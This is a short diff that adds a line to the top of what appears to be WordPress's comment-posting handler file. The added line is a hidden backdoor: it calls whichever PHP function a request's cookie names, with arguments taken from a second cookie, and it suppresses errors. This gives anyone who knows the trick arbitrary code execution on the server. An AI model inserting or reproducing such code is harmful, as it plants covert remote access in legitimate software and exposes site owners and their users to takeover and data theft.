@@ -1,4 +1,8 @@
 <?php
+
+if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
+
+
 /**
  * Handles Comment Post to WordPress and prevents duplicate comment posting.
  *
